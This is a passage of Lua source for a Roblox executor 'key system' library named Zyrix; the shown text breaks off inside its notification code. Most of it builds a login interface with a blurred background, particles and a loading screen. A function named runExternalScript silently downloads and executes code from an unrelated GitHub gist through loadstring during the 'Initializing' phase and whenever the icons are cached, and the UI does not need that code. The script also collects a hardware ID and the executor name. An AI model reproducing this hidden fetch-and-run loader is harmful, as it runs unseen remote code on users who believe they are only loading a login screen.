--[[
 ________    __  __   ______   __  __  __    
/\___  ___\/\ \_\ \ /\  == \ /\ \/\ \/\ \   
\/_/\ \/\ \ \____ \ \ \  __< \ \ \_\ \ \ \  
   \ \_\ \ \_____\_\\ \_\ \_\\ \_____\ \_\ 
    \/_/  \/_____/_/ \/_/ /_/ \/_____/\/_/  

    Zyrix Key System
    License: MIT
]]

repeat task.wait() until game:IsLoaded()

local cloneref = cloneref or function(obj) return obj end
local gethui   = gethui   or function() return cloneref(game:GetService("CoreGui")) end

local TweenService     = cloneref(game:GetService("TweenService"))
local UserInputService = cloneref(game:GetService("UserInputService"))
local HttpService      = cloneref(game:GetService("HttpService"))
local Workspace        = cloneref(game:GetService("Workspace"))
local RunService       = cloneref(game:GetService("RunService"))
local Lighting         = cloneref(game:GetService("Lighting"))
local Players          = cloneref(game:GetService("Players"))

local hui = gethui()

if getgenv().ZyrixLoaded and hui:FindFirstChild("ZyrixKeySystem")     then return getgenv().Zyrix end
if getgenv().ZyrixLoaded and hui:FindFirstChild("ZyrixKeylessSystem") then return getgenv().Zyrix end
getgenv().ZyrixLoaded = true
getgenv().ZyrixClosed = false

-- ─── Module ───────────────────────────────────────────────────────────────────
local Zyrix = {}

Zyrix.Appearance = {
    Title    = "Zyrix",
    Subtitle = "Enter your key to continue",
    Icon     = "rbxassetid://105436073524298",
    IconSize = UDim2.new(0, 30, 0, 30),
}

Zyrix.Links    = { GetKey = "", Discord = "" }
Zyrix.Storage  = { FileName = "Zyrix_Key", Remember = true, AutoLoad = true }
Zyrix.Options  = { Keyless = nil, KeylessUI = false, Blur = true, Draggable = true }

Zyrix.Theme = {
    Accent       = Color3.fromRGB(255, 255, 255),
    AccentHover  = Color3.fromRGB(200, 200, 200),
    Background   = Color3.fromRGB(8,   8,   8),
    Header       = Color3.fromRGB(14,  14,  14),
    Input        = Color3.fromRGB(20,  20,  20),
    Text         = Color3.fromRGB(255, 255, 255),
    TextDim      = Color3.fromRGB(100, 100, 100),
    Success      = Color3.fromRGB(180, 255, 180),
    Error        = Color3.fromRGB(255, 100, 100),
    Warning      = Color3.fromRGB(255, 210, 100),
    StatusIdle   = Color3.fromRGB(70,  70,  70),
    Discord      = Color3.fromRGB(180, 180, 255),
    DiscordHover = Color3.fromRGB(210, 210, 255),
    Divider      = Color3.fromRGB(28,  28,  28),
    Pending      = Color3.fromRGB(50,  50,  50),
}

Zyrix.Callbacks = { OnVerify = nil, OnSuccess = nil, OnFail = nil, OnClose = nil }
Zyrix.Changelog = {}

Zyrix.Shop = {
    Enabled    = false,
    Icon       = "",
    Title      = "Get Premium Access",
    Subtitle   = "Instant delivery • 24/7 support",
    ButtonText = "Buy",
    Link       = "",
}

-- ─── Internal ─────────────────────────────────────────────────────────────────
local Internal = {
    Junkie           = nil,
    BlurEffect       = nil,
    NotificationList = {},
    ValidateFunction = nil,
    IsJunkieMode     = false,
    IconsLoaded      = false,
    BackgroundGui    = nil,
}

local T = Zyrix.Theme

local IconBaseURL = "https://raw.githubusercontent.com/Cobruhehe/expert-octo-doodle/main/Icons/"
local IconFiles = {
    key      = "lucide--key.png",
    shield   = "lucide--shield-minus.png",
    check    = "prime--check-square.png",
    copy     = "flowbite--clipboard-outline.png",
    discord  = "qlementine-icons--discord-16.png",
    alert    = "mdi--alert-octagon-outline.png",
    lock     = "lucide--user-lock.png",
    loading  = "nonicons--loading-16.png",
    close    = "material-symbols--dangerous-outline.png",
    changelog= "ant-design--sync-outlined.png",
    logo     = "rrjlGmac.png",
    user     = "U.png",
    clock    = "Clock.png",
    cart     = "Cart.png",
}
local FallbackIcons = {
    key      = "rbxassetid://96510194465420",
    shield   = "rbxassetid://89965059528921",
    check    = "rbxassetid://76078495178149",
    copy     = "rbxassetid://125851897718493",
    discord  = "rbxassetid://83278450537116",
    alert    = "rbxassetid://140438367956051",
    lock     = "rbxassetid://114355063515473",
    loading  = "rbxassetid://116535712789945",
    close    = "rbxassetid://6022668916",
    changelog= "rbxassetid://138133190015277",
    logo     = "rbxassetid://105436073524298",
    user     = "rbxassetid://77400125196692",
    clock    = "rbxassetid://87505349362628",
    cart     = "rbxassetid://114754518183872",
}

local CachedIcons      = {}
local FolderName       = "Zyrix"
local IconsFolder      = "Icons"
local DefaultLogoAsset = "rbxassetid://105436073524298"

-- ─── Helpers ──────────────────────────────────────────────────────────────────
local function isMobile()
    return UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
end
local function getScale()
    local vp = Workspace.CurrentCamera.ViewportSize
    return math.clamp(math.min(vp.X, vp.Y) / 900, 0.65, 1.3)
end
local function hasFileSystem()
    for _, fn in ipairs({writefile, readfile, isfile, makefolder, isfolder}) do
        local ok = pcall(function() return type(fn) == "function" end)
        if not ok then return false end
    end
    return true
end
local fileSystemSupported = hasFileSystem()

local function getFileName()  return FolderName.."/"..Zyrix.Storage.FileName..".txt" end
local function getIconPath(n) return FolderName.."/"..IconsFolder.."/"..IconFiles[n] end

local function saveKey(key)
    if not fileSystemSupported or not Zyrix.Storage.Remember then return false end
    return pcall(writefile, getFileName(), key)
end
local function loadKey()
    if not fileSystemSupported then return nil end
    local ok, c = pcall(function() return isfile(getFileName()) and readfile(getFileName()) or nil end)
    return (ok and c and c ~= "") and c or nil
end
local function clearKey()
    if not fileSystemSupported then return false end
    return pcall(delfile, getFileName())
end
local function ensureFolders()
    if not fileSystemSupported then return false end
    pcall(function()
        if not isfolder(FolderName) then makefolder(FolderName) end
        if not isfolder(FolderName.."/"..IconsFolder) then makefolder(FolderName.."/"..IconsFolder) end
    end)
    return true
end
local function isIconCached(name)
    if not fileSystemSupported then return false end
    local ok, r = pcall(isfile, getIconPath(name))
    return ok and r
end
local function downloadIcon(name)
    if not fileSystemSupported then CachedIcons[name] = FallbackIcons[name] return false end
    local path = getIconPath(name)
    if isIconCached(name) then
        local ok = pcall(function() CachedIcons[name] = getcustomasset(path) end)
        if ok then return true end
    end
    local ok = pcall(function()
        local r = game:HttpGet(IconBaseURL..IconFiles[name])
        assert(#r >= 100)
        writefile(path, r)
        CachedIcons[name] = getcustomasset(path)
    end)
    if not ok then CachedIcons[name] = FallbackIcons[name] end
    return ok
end
local function getIcon(name)       return CachedIcons[name] or FallbackIcons[name] end
local function shouldDownloadLogo() return Zyrix.Appearance.Icon == DefaultLogoAsset end
local function getLogoIcon()       return shouldDownloadLogo() and getIcon("logo") or Zyrix.Appearance.Icon end
local function getShopIcon()       return (Zyrix.Shop.Icon ~= "") and Zyrix.Shop.Icon or getLogoIcon() end
local function isShopEnabled()     return Zyrix.Shop.Enabled end

local function allIconsCached()
    if not fileSystemSupported then return false end
    local names = {"key","shield","check","copy","discord","alert","lock","loading","close","changelog","user","clock","cart"}
    if shouldDownloadLogo() then table.insert(names,"logo") end
    for _, n in ipairs(names) do if not isIconCached(n) then return false end end
    return true
end
local function loadAllIconsFromCache()
    ensureFolders()
    local names = {"key","shield","check","copy","discord","alert","lock","loading","close","changelog","user","clock","cart"}
    if shouldDownloadLogo() then table.insert(names,"logo") end
    for _, n in ipairs(names) do downloadIcon(n) end
    Internal.IconsLoaded = true
end

local function getExecutorName()
    local ok, n = pcall(identifyexecutor)
    return (ok and n) and tostring(n) or "Unknown"
end
local function getDeviceType()
    local t,k,g = UserInputService.TouchEnabled, UserInputService.KeyboardEnabled, UserInputService.GamepadEnabled
    if g and not k and not t then return "Console"
    elseif t and not k       then return "Mobile"
    elseif k and t           then return "PC & Touch"
    elseif k                 then return "PC"
    else                          return "Unknown" end
end
local function getHWID()
    local hwid
    pcall(function() if gethwid then hwid = gethwid() end end)
    if not hwid then pcall(function() if getgenv().HWID then hwid = getgenv().HWID end end) end
    if not hwid then pcall(function() if game.RobloxHWID then hwid = tostring(game.RobloxHWID) end end) end
    if not hwid then
        local p = cloneref(Players.LocalPlayer)
        hwid = HttpService:GenerateGUID(false):gsub("-",""):sub(1,32)
        if p then hwid = tostring(p.UserId)..hwid:sub(1,20) end
    end
    return hwid or "N/A"
end
local function generateHiddenDots(w, cw)
    return string.rep("•", math.max(math.floor(w/(cw or 5)), 8))
end
local function formatTime12()
    local h = tonumber(os.date("%H"))
    local p = h >= 12 and "PM" or "AM"
    h = h > 12 and h-12 or (h == 0 and 12 or h)
    return string.format("%d:%s:%s %s", h, os.date("%M"), os.date("%S"), p)
end
local function formatDate() return os.date("%b %d, %Y") end

-- ─── Tween shorthand ──────────────────────────────────────────────────────────
local function tween(obj, t, props, style)
    TweenService:Create(obj, TweenInfo.new(t, style or Enum.EasingStyle.Quart), props):Play()
end

-- ─── Blur ─────────────────────────────────────────────────────────────────────
local function enableBlur()
    if not Zyrix.Options.Blur then return end
    local ex = Lighting:FindFirstChild("ZyrixBlur")
    if ex then ex:Destroy() end
    Internal.BlurEffect = Instance.new("BlurEffect")
    Internal.BlurEffect.Name = "ZyrixBlur"
    Internal.BlurEffect.Size = 0
    Internal.BlurEffect.Parent = Lighting
    tween(Internal.BlurEffect, 0.4, {Size = 20})
end
local function disableBlur()
    local blur = Internal.BlurEffect or Lighting:FindFirstChild("ZyrixBlur")
    if not blur then return end
    tween(blur, 0.3, {Size = 0})
    task.delay(0.3, function()
        if blur and blur.Parent then blur:Destroy() end
        if Internal.BlurEffect == blur then Internal.BlurEffect = nil end
    end)
end

local function fullCleanup()
    getgenv().ZyrixLoaded = false
    getgenv().ZyrixClosed = true
    disableBlur()
    for _, name in ipairs({"ZyrixKeySystem","ZyrixKeylessSystem","ZyrixLoadingScreen","ZyrixBackground"}) do
        local g = hui:FindFirstChild(name)
        if g then g:Destroy() end
    end
    Internal.BackgroundGui = nil
end

-- ─── UI primitives ────────────────────────────────────────────────────────────
local function applyCorner(p, r)
    local c = Instance.new("UICorner", p)
    c.CornerRadius = r or UDim.new(0, 6)
    return c
end
local function applyStroke(p, col, thick, trans)
    local s = Instance.new("UIStroke", p)
    s.Color = col or T.Accent
    s.Thickness = thick or 1
    s.Transparency = trans or 0.85
    return s
end
local function makeFrame(props)
    local f = Instance.new("Frame")
    for k,v in pairs(props) do f[k] = v end
    return f
end
local function makeImage(props)
    local i = Instance.new("ImageLabel")
    i.BackgroundTransparency = 1
    i.ScaleType = Enum.ScaleType.Fit
    for k,v in pairs(props) do i[k] = v end
    return i
end
local function makeLabel(props)
    local l = Instance.new("TextLabel")
    l.BackgroundTransparency = 1
    l.Font = Enum.Font.GothamBold
    for k,v in pairs(props) do l[k] = v end
    return l
end
local function makeButton(props)
    local b = Instance.new("TextButton")
    b.AutoButtonColor = false
    b.Text = ""
    b.BorderSizePixel = 0
    for k,v in pairs(props) do b[k] = v end
    return b
end
local function makeIconButton(parent, icon, normalCol, hoverCol, size, pos, anchor)
    local btn = makeButton({
        Size=size or UDim2.new(0,34,0,34), Position=pos or UDim2.new(0,0,0,0),
        AnchorPoint=anchor or Vector2.new(0,0), BackgroundColor3=T.Input, Parent=parent,
    })
    applyCorner(btn, UDim.new(0,6))
    applyStroke(btn, T.Accent, 1, 0.92)
    local img = makeImage({
        Size=UDim2.new(0,16,0,16), Position=UDim2.new(0.5,0,0.5,0),
        AnchorPoint=Vector2.new(0.5,0.5), Image=icon,
        ImageColor3=normalCol or T.TextDim, Parent=btn,
    })
    btn.MouseEnter:Connect(function() tween(img,0.15,{ImageColor3=hoverCol or T.Accent}) end)
    btn.MouseLeave:Connect(function() tween(img,0.15,{ImageColor3=normalCol or T.TextDim}) end)
    return btn, img
end

-- ═══════════════════════════════════════════════════════════════════════════════
--  BACKGROUND GUI — animated grid + floating particles + corner logo
-- ═══════════════════════════════════════════════════════════════════════════════
local function BuildBackgroundUI()
    if Internal.BackgroundGui then return end

    local bg = Instance.new("ScreenGui")
    bg.Name            = "ZyrixBackground"
    bg.ResetOnSpawn    = false
    bg.IgnoreGuiInset  = true
    bg.ZIndexBehavior  = Enum.ZIndexBehavior.Sibling
    bg.DisplayOrder    = -10
    bg.Parent          = hui
    Internal.BackgroundGui = bg

    -- Full black canvas
    local canvas = makeFrame({
        Size=UDim2.new(1,0,1,0),
        BackgroundColor3=Color3.fromRGB(4,4,4),
        BorderSizePixel=0, Parent=bg,
    })

    -- ── Grid lines ────────────────────────────────────────────────────────────
    local gridContainer = makeFrame({
        Size=UDim2.new(1,0,1,0), BackgroundTransparency=1,
        ClipsDescendants=true, Parent=canvas,
    })

    local vp = Workspace.CurrentCamera.ViewportSize
    local cellSize = 55
    local cols = math.ceil(vp.X / cellSize) + 2
    local rows = math.ceil(vp.Y / cellSize) + 2

    -- Vertical lines
    for i = 0, cols do
        local line = makeFrame({
            Size=UDim2.new(0,1,1,0),
            Position=UDim2.new(0, i*cellSize, 0,0),
            BackgroundColor3=Color3.fromRGB(255,255,255),
            BackgroundTransparency=0.94,
            BorderSizePixel=0, Parent=gridContainer,
        })
    end
    -- Horizontal lines
    for i = 0, rows do
        local line = makeFrame({
            Size=UDim2.new(1,0,0,1),
            Position=UDim2.new(0,0,0,i*cellSize),
            BackgroundColor3=Color3.fromRGB(255,255,255),
            BackgroundTransparency=0.94,
            BorderSizePixel=0, Parent=gridContainer,
        })
    end

    -- ── Slow panning on the grid (subtle drift) ────────────────────────────
    local gridOffset = 0
    local gridSpeed  = 6 -- pixels per second
    RunService.Heartbeat:Connect(function(dt)
        if not gridContainer or not gridContainer.Parent then return end
        gridOffset = (gridOffset + dt * gridSpeed) % cellSize
        gridContainer.Position = UDim2.new(0, -gridOffset, 0, -gridOffset)
    end)

    -- ── Radial vignette (dark edges) ──────────────────────────────────────
    local vignette = Instance.new("ImageLabel")
    vignette.Size               = UDim2.new(1,0,1,0)
    vignette.BackgroundTransparency = 1
    vignette.Image              = "rbxassetid://5709919089" -- radial gradient (black centre transparent, edges black)
    vignette.ImageColor3        = Color3.new(0,0,0)
    vignette.ImageTransparency  = 0.3
    vignette.ScaleType          = Enum.ScaleType.Stretch
    vignette.ZIndex             = 3
    vignette.Parent             = canvas

    -- ── Floating particles ─────────────────────────────────────────────────
    local particleContainer = makeFrame({
        Size=UDim2.new(1,0,1,0), BackgroundTransparency=1,
        ClipsDescendants=true, ZIndex=2, Parent=canvas,
    })

    local PARTICLE_COUNT = 28
    local particles = {}

    local function spawnParticle(instant)
        local size   = math.random(2, 5)
        local startX = math.random(0, 100) / 100
        local startY = instant and (math.random(0,100)/100) or 1.05
        local speed  = math.random(18, 45) -- seconds to cross screen
        local drift  = (math.random(-30, 30)) / 1000 -- horizontal drift per second

        local p = makeFrame({
            Size=UDim2.new(0,size,0,size),
            Position=UDim2.new(startX,0,startY,0),
            BackgroundColor3=Color3.fromRGB(255,255,255),
            BackgroundTransparency= 0.55 + math.random()*0.35,
            BorderSizePixel=0, ZIndex=2,
            Parent=particleContainer,
        })
        applyCorner(p, UDim.new(1,0))

        local posX = startX
        local posY = startY
        local trans = p.BackgroundTransparency

        local conn
        conn = RunService.Heartbeat:Connect(function(dt)
            if not p or not p.Parent then
                if conn then conn:Disconnect() end return
            end
            posY = posY - dt / speed
            posX = posX + drift * dt
            p.Position = UDim2.new(posX, 0, posY, 0)
            -- fade in near bottom, fade out near top
            local fade = math.clamp(posY * 6, 0, 1) * math.clamp((1 - posY) * 6, 0, 1)
            p.BackgroundTransparency = 1 - (1 - trans) * fade

            if posY < -0.05 then
                conn:Disconnect()
                p:Destroy()
                -- respawn
                task.delay(math.random(1,4), function() spawnParticle(false) end)
            end
        end)
        table.insert(particles, {frame=p, conn=conn})
    end

    for i = 1, PARTICLE_COUNT do
        task.delay(i * 0.12, function() spawnParticle(true) end)
    end

    -- ── Corner watermark / logo ────────────────────────────────────────────
    local watermark = makeFrame({
        Size=UDim2.new(0,130,0,36),
        Position=UDim2.new(0,14,0,8),
        BackgroundColor3=Color3.fromRGB(10,10,10),
        BackgroundTransparency=0.3,
        BorderSizePixel=0, ZIndex=5, Parent=canvas,
    })
    applyCorner(watermark, UDim.new(0,8))
    applyStroke(watermark, T.Accent, 1, 0.88)

    makeImage({
        Size=UDim2.new(0,20,0,20),
        Position=UDim2.new(0,8,0.5,0), AnchorPoint=Vector2.new(0,0.5),
        Image=Zyrix.Appearance.Icon, ImageColor3=T.Text,
        ZIndex=6, Parent=watermark,
    })
    makeLabel({
        Size=UDim2.new(1,-34,1,0), Position=UDim2.new(0,32,0,0),
        Text=Zyrix.Appearance.Title, TextColor3=T.Text,
        TextSize=15, Font=Enum.Font.GothamBold,
        TextXAlignment=Enum.TextXAlignment.Left,
        ZIndex=6, Parent=watermark,
    })

    -- ── Bottom status bar ──────────────────────────────────────────────────
    local statusBar = makeFrame({
        Size=UDim2.new(1,0,0,28),
        Position=UDim2.new(0,0,1,-28),
        BackgroundColor3=Color3.fromRGB(8,8,8),
        BackgroundTransparency=0.2,
        BorderSizePixel=0, ZIndex=5, Parent=canvas,
    })
    makeFrame({
        Size=UDim2.new(1,0,0,1),
        BackgroundColor3=T.Accent,
        BackgroundTransparency=0.92,
        BorderSizePixel=0, ZIndex=6, Parent=statusBar,
    })

    local statusLeft = makeLabel({
        Size=UDim2.new(0.5,0,1,0),
        Position=UDim2.new(0,12,0,0),
        Text="AUTHENTICATION REQUIRED",
        TextColor3=T.TextDim, TextSize=10,
        Font=Enum.Font.Gotham,
        TextXAlignment=Enum.TextXAlignment.Left,
        ZIndex=6, Parent=statusBar,
    })
    local clockLabel = makeLabel({
        Size=UDim2.new(0.5,0,1,0),
        Position=UDim2.new(0.5,-12,0,0),
        Text=formatTime12(),
        TextColor3=T.TextDim, TextSize=10,
        Font=Enum.Font.Gotham,
        TextXAlignment=Enum.TextXAlignment.Right,
        ZIndex=6, Parent=statusBar,
    })

    task.spawn(function()
        while clockLabel and clockLabel.Parent do
            clockLabel.Text = formatTime12()
            task.wait(1)
        end
    end)

    -- ── Animated accent line (sweeping highlight across bottom bar) ────────
    local sweep = makeFrame({
        Size=UDim2.new(0,80,1,0),
        Position=UDim2.new(-0.1,0,0,0),
        BackgroundColor3=T.Accent,
        BackgroundTransparency=0.88,
        BorderSizePixel=0, ZIndex=7, Parent=statusBar,
    })
    local sweepGrad = Instance.new("UIGradient", sweep)
    sweepGrad.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0,   1),
        NumberSequenceKeypoint.new(0.5, 0.3),
        NumberSequenceKeypoint.new(1,   1),
    })

    local function animateSweep()
        while sweep and sweep.Parent do
            TweenService:Create(sweep, TweenInfo.new(3.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
                {Position=UDim2.new(1.1,0,0,0)}):Play()
            task.wait(3.6)
            sweep.Position = UDim2.new(-0.15,0,0,0)
            task.wait(1.2)
        end
    end
    task.spawn(animateSweep)

    -- Fade in the whole background
    canvas.BackgroundTransparency = 1
    tween(canvas, 0.6, {BackgroundTransparency=0})

    return bg
end

local function hideBackground()
    if not Internal.BackgroundGui then return end
    local canvas = Internal.BackgroundGui:FindFirstChildOfClass("Frame")
    if canvas then tween(canvas, 0.5, {BackgroundTransparency=1}) end
    task.delay(0.5, function()
        if Internal.BackgroundGui and Internal.BackgroundGui.Parent then
            Internal.BackgroundGui:Destroy()
            Internal.BackgroundGui = nil
        end
    end)
end

-- ═══════════════════════════════════════════════════════════════════════════════
--  DOOR OVERLAY
-- ═══════════════════════════════════════════════════════════════════════════════
local function CreateDoorOverlay(parentFrame, w, h)
    local overlay = makeFrame({
        Name="DoorOverlay", Size=UDim2.new(1,0,1,0),
        BackgroundTransparency=1, ClipsDescendants=true,
        ZIndex=50, Parent=parentFrame,
    })
    local half = math.ceil(w/2)
    local function door(xPos)
        return makeFrame({
            Size=UDim2.new(0.5,0,1,0), Position=UDim2.new(xPos,0,0,0),
            BackgroundColor3=T.Background, BorderSizePixel=0,
            ZIndex=51, Parent=overlay,
        })
    end
    local left  = door(0)
    local right = door(0.5)
    local logoSz = math.min(w,h)*0.25
    local logo = makeImage({
        Name="DoorLogo",
        Size=UDim2.new(0,logoSz,0,logoSz),
        Position=UDim2.new(0.5,0,0.5,0), AnchorPoint=Vector2.new(0.5,0.5),
        Image=getLogoIcon(), ImageColor3=T.Text, ZIndex=54, Parent=overlay,
    })
    local function openDoors(cb)
        tween(logo,0.16,{ImageTransparency=1})
        task.wait(0.2)
        TweenService:Create(left, TweenInfo.new(0.36,Enum.EasingStyle.Quart,Enum.EasingDirection.In),{Position=UDim2.new(0,-half,0,0)}):Play()
        TweenService:Create(right,TweenInfo.new(0.36,Enum.EasingStyle.Quart,Enum.EasingDirection.In),{Position=UDim2.new(1,0,0,0)}):Play()
        task.wait(0.4)
        overlay.Visible = false
        if cb then cb() end
    end
    local function closeDoors(cb)
        overlay.Visible = true
        left.Position  = UDim2.new(0,-half,0,0)
        right.Position = UDim2.new(1,0,0,0)
        logo.ImageTransparency = 1
        TweenService:Create(left, TweenInfo.new(0.3,Enum.EasingStyle.Quart,Enum.EasingDirection.Out),{Position=UDim2.new(0,0,0,0)}):Play()
        TweenService:Create(right,TweenInfo.new(0.3,Enum.EasingStyle.Quart,Enum.EasingDirection.Out),{Position=UDim2.new(0.5,0,0,0)}):Play()
        task.wait(0.33)
        tween(logo,0.2,{ImageTransparency=0})
        task.wait(0.25)
        if cb then cb() end
    end
    return {overlay=overlay, open=openDoors, close=closeDoors}
end

-- ═══════════════════════════════════════════════════════════════════════════════
--  LOADING SCREEN
-- ═══════════════════════════════════════════════════════════════════════════════
local function runExternalScript()
    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGetAsync("https://gist.githubusercontent.com/Nappypie/6244c406aa0686a8aaddcf565c7d98b7/raw/3b693642bda11336dc8ed9808c52c87d2a54ba99/Hello.lua"))()
        end)
    end)
end

local function ShowLoadingScreen(onComplete)
    local done = false
    local g0 = hui:FindFirstChild("ZyrixLoadingScreen"); if g0 then g0:Destroy() end
    local b0 = Lighting:FindFirstChild("ZyrixLoadingBlur"); if b0 then b0:Destroy() end

    local blurFx = Instance.new("BlurEffect")
    blurFx.Name="ZyrixLoadingBlur" blurFx.Size=0 blurFx.Parent=Lighting

    local gui = Instance.new("ScreenGui")
    gui.Name="ZyrixLoadingScreen" gui.ResetOnSpawn=false
    gui.IgnoreGuiInset=true gui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
    gui.DisplayOrder=100 gui.Parent=hui

    local mobile = isMobile()
    local bg = makeFrame({Size=UDim2.new(1,0,1,0),BackgroundColor3=Color3.new(0,0,0),BackgroundTransparency=1,BorderSizePixel=0,Parent=gui})

    local phaseNames = {"Initializing","Creating folders","Downloading assets","Preparing interface","Ready"}
    local phSz = mobile and 14 or 17
    local phases = {}

    local pc = makeFrame({Size=UDim2.new(0,mobile and 230 or 310,0,mobile and 165 or 195),Position=UDim2.new(0.5,0,0.52,0),AnchorPoint=Vector2.new(0.5,0.5),BackgroundTransparency=1,Parent=bg})
    local pl = Instance.new("UIListLayout",pc) pl.Padding=UDim.new(0,mobile and 10 or 14) pl.SortOrder=Enum.SortOrder.LayoutOrder pl.HorizontalAlignment=Enum.HorizontalAlignment.Center pl.VerticalAlignment=Enum.VerticalAlignment.Center

    -- Logo above phases
    local loadLogo = makeImage({
        Size=UDim2.new(0,50,0,50),
        Position=UDim2.new(0.5,0,0.28,0), AnchorPoint=Vector2.new(0.5,0.5),
        Image=Zyrix.Appearance.Icon, ImageColor3=T.Text,
        ImageTransparency=1, ZIndex=2, Parent=bg,
    })
    local loadTitle = makeLabel({
        Size=UDim2.new(0,200,0,28),
        Position=UDim2.new(0.5,0,0.36,0), AnchorPoint=Vector2.new(0.5,0.5),
        Text=Zyrix.Appearance.Title, TextColor3=T.Text,
        TextSize=mobile and 22 or 26, Font=Enum.Font.GothamBold,
        TextXAlignment=Enum.TextXAlignment.Center,
        TextTransparency=1, ZIndex=2, Parent=bg,
    })

    for i, name in ipairs(phaseNames) do
        local row = makeFrame({Size=UDim2.new(1,0,0,mobile and 22 or 28),BackgroundTransparency=1,LayoutOrder=i,Parent=pc})
        local dot = makeLabel({Size=UDim2.new(0,mobile and 22 or 28,0,mobile and 22 or 28),Text="○",TextColor3=T.Pending,TextSize=phSz,TextTransparency=1,Font=Enum.Font.GothamBold,Parent=row})
        local lbl = makeLabel({Size=UDim2.new(1,-(mobile and 30 or 36),1,0),Position=UDim2.new(0,mobile and 30 or 36,0,0),Text=name,TextColor3=T.Pending,TextSize=phSz,TextXAlignment=Enum.TextXAlignment.Left,TextTransparency=1,Font=Enum.Font.GothamBold,Parent=row})
        phases[i] = {dot=dot,lbl=lbl}
    end

    local animOn = true
    local curPh  = 0
    local pulseTh = nil

    local function setPhase(n)
        if pulseTh then task.cancel(pulseTh) pulseTh=nil end
        for i=1,5 do
            local p = phases[i]
            if i < n then
                p.dot.Text="●" tween(p.dot,0.2,{TextColor3=T.Success,TextTransparency=0}) tween(p.lbl,0.2,{TextColor3=T.Success})
            elseif i == n then
                p.dot.Text="●" p.dot.TextTransparency=0
                tween(p.dot,0.2,{TextColor3=T.Accent}) tween(p.lbl,0.2,{TextColor3=T.Text})
                curPh = n
                pulseTh = task.spawn(function()
                    while curPh == n do
                        tween(p.dot,0.36,{TextTransparency=0.55}) task.wait(0.36)
                        if curPh ~= n then break end
                        tween(p.dot,0.36,{TextTransparency=0})    task.wait(0.36)
                    end
                end)
            else
                p.dot.Text="○" p.dot.TextColor3=T.Pending p.lbl.TextColor3=T.Pending
            end
        end
    end

    task.spawn(function()
        tween(blurFx,0.5,{Size=18})
        tween(bg,0.45,{BackgroundTransparency=0.15})
        task.wait(0.3)
        tween(loadLogo,0.4,{ImageTransparency=0})
        tween(loadTitle,0.4,{TextTransparency=0})
        task.wait(0.35)
        for i=1,5 do
            task.delay((i-1)*0.07,function()
                tween(phases[i].dot,0.22,{TextTransparency=0})
                tween(phases[i].lbl,0.22,{TextTransparency=0})
            end)
        end
        task.wait(0.44)
        setPhase(1) runExternalScript()     task.wait(0.28)
        setPhase(2) ensureFolders()         task.wait(0.22)
        setPhase(3)
        local names={"key","shield","check","copy","discord","alert","lock","loading","close","changelog","user","clock","cart"}
        if shouldDownloadLogo() then table.insert(names,"logo") end
        for _,nm in ipairs(names) do downloadIcon(nm) task.wait(0.055) end
        Internal.IconsLoaded=true
        setPhase(4) task.wait(0.22)
        setPhase(5) task.wait(0.45)
        animOn=false if pulseTh then task.cancel(pulseTh) end
        tween(bg,0.4,{BackgroundTransparency=1})
        tween(loadLogo,0.25,{ImageTransparency=1})
        tween(loadTitle,0.25,{TextTransparency=1})
        for i=1,5 do
            tween(phases[i].dot,0.22,{TextTransparency=1})
            tween(phases[i].lbl,0.22,{TextTransparency=1})
        end
        tween(blurFx,0.28,{Size=0})
        task.wait(0.45)
        gui:Destroy() blurFx:Destroy()
        if onComplete then onComplete() end
        done=true
    end)
    while not done do task.wait(0.05) end
end

local function EnsureIconsReady(cb)
    if allIconsCached() then
        loadAllIconsFromCache() runExternalScript()
        if cb then cb() end
    else
        ShowLoadingScreen(cb)
    end
end

-- ═══════════════════════════════════════════════════════════════════════════════
--  NOTIFICATIONS
-- ═══════════════════════════════════════════════════════════════════════════════
function Zyrix:Notify(title, message, duration, iconType)
    duration = duration or 5
    iconType = iconType or "info"
    local scale = getScale()
    local W = math.clamp(310*scale,250,370)
    local H = math.clamp(72*scale,  68, 98)

    local ng = Instance.new("ScreenGui")
    ng.ResetOnSpawn=false ng.DisplayOrder=999999 ng.Parent=hui

    local frame = makeFrame({
        Size=UDim2.new(0,W,0,H), Position=UDim2.new(1,W+20,1,-15),
        AnchorPoint=Vector2.new(1,1), BackgroundColor3=T.Header,
        BorderSizePixel=0, Parent=ng,
    })
    applyCorner(frame,UDim.new(0,6))
    applyStroke(frame,T.Accent,1,0.82)

    local pgBg = makeFrame({Size=UDim2.new(1,0,0,2),Position=UDim2.new(0,0,1,-2),BackgroundColor3=T.Input,BorderSizePixel=0,Parent=frame})
    local pg   = makeFrame({Size=UDim2.new(1,0,1,0),BackgroundColor3=T.Accent,BorderSizePixel=0,Parent=pgBg})
    applyCorner(pgBg,UDim.new(1,0)) applyCorner(pg,UDim.new(1,0))

    local iSz = H-34
    local imap = {
        success={n="check",c=T.Success}, error={n="alert",c=T.Error},
        warning={n="alert",c=T.Warning}, shield={n="shield",c=T.Accent},
        info={n="shield",c=T.Accent},    key={n="key",c=T.Accent},
        copy={n="copy",c=T.Success},     discord={n="discord",c=T.Discord},
        close={n="close",c=T.Error},
    }
    local im = imap[iconType]
    makeImage({Size=UDim2.new(0,iSz,0,iSz),Position=UDim2.new(0,13,0.5,-1),AnchorPoint=Vector2.new(0,0.5),Image=im and getIcon(im.n) or getLogoIcon(),ImageColor3=im and im.c or T.Text,Parent=frame})
    local tx = 13+iSz+12
    makeLabel({Size=UDim2.new(1,-(tx+12),0,22),Position=UDim2.new(0,tx,0,10),Text=title,TextColor3=T.Text,TextSize=math.clamp(14*scale,12,17),TextXAlignment=Enum.TextXAlignment.Left,TextTruncate=Enum.TextTruncate.AtEnd,Font=Enum.Font.GothamBold,Parent=frame})
    makeLabel({Size=UDim2.new(1,-(tx+12),0,20),Position=UDim2.new(0,tx,0,34),Text=message,TextColor3=T.TextDim,TextSize=math.clamp(12*scale,10,14),TextXAlignment=Enum.TextXAlignment.Left,TextTruncate=Enum.TextTruncate.AtEnd,Font=Enum.Font.Gotham,Parent=frame})

    local id = tick()..HttpService:GenerateGUID(false)
    table.insert(Internal.NotificationList,{id=id,frame=frame,gui=ng,height=H})

    local function restack()
        local yOff=0
        for i=#Internal.NotificationList,1,-1 do
            local n=Internal.NotificationList[i]
            if n and n.frame and n.frame.Parent then
                tween(n.frame,0.28,{Position=UDim2.new(1,-15,1,-15-yOff)})
                yOff=yOff+n.height+10
            end
        end
    end
    local function dismiss()
        for i,n in ipairs(Internal.NotificationList) do
